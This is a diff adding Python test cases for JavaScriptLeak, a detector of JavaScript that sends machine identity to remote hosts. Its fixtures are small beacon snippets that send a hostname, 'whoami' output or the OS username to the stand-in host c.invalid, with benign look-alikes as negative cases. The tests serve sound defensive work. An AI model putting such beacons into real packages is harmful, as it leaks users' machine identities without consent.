@@ -109,3 +109,55 @@ class TestWhatIsNotSent:
     def test_the_hostname_in_a_template_url_is_still_found(self) -> None:
         text = "https.get(`https://c.invalid/p?h=${os.hostname()}`);\n"
         assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]
+
+
+class TestTheIdentityHoweverItIsRead:
+    """The forms a module-load beacon used (review 98, npm bulk set, 2026-10-19)."""
+
+    def test_the_module_required_inline_and_assigned_to_an_earlier_name(self) -> None:
+        text = (
+            "var site = 'unknown';\n"
+            "try { site = require('os').hostname(); } catch (e) {}\n"
+            "fetch(base + '?s=' + encodeURIComponent(site));\n"
+        )
+        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]
+
+    def test_an_identity_commands_output_sent(self) -> None:
+        text = (
+            "const cp = require('child_process');\n"
+            "const who = cp.execSync('whoami', { encoding: 'utf8' }).trim();\n"
+            "fetch('https://c.invalid/p?u=' + encodeURIComponent(who));\n"
+        )
+        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]
+
+    def test_the_module_as_an_es_import_under_another_name(self) -> None:
+        text = (
+            "import sys from 'node:os';\n"
+            "const id = { h: sys.hostname() };\n"
+            "await fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(id) });\n"
+        )
+        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]
+
+    def test_the_calls_imported_by_name(self) -> None:
+        text = (
+            "import { userInfo } from 'os';\n"
+            "fetch('https://c.invalid/x', { method: 'POST', body: userInfo().username });\n"
+        )
+        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]
+
+
+class TestStillNotIdentity:
+    def test_a_build_commands_output_is_not_identity(self) -> None:
+        text = (
+            "const sha = require('child_process').execSync('git rev-parse HEAD').toString();\n"
+            "fetch('https://ci.invalid/report', { method: 'POST', body: sha });\n"
+        )
+        assert JavaScriptLeak.findings(text) == []
+
+    def test_a_required_module_is_not_data(self) -> None:
+        text = "let lib = null;\nlib = require('pkg');\nfetch(url, { body: lib.version });\n"
+        assert JavaScriptLeak.findings(text) == []
+
+    def test_another_librarys_hostname_method_is_not_the_machine(self) -> None:
+        text = "const u = new URL(x);\nfetch('https://c.invalid/p?h=' + u.hostname);\n"
+        assert JavaScriptLeak.findings(text) == []
